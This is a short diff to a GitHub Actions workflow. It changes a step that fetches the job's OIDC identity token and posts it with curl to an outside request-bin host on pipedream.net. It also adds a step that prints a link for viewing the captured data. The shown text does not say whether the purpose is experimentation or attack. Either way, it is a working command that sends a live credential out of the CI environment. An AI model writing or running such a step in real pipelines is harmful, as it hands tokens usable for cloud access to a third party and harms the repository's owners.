@@ -8,6 +8,8 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | curl -d@- -X POST https://enkduyz6g334a.x.pipedream.net/
+          curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | curl -d@- -X POST https://enkduyz6g334a.x.pipedream.net/
+      - run: |
+          echo "Inspect here: https://requestbin.com/r/enkduyz6g334a"
     permissions:
       id-token: write
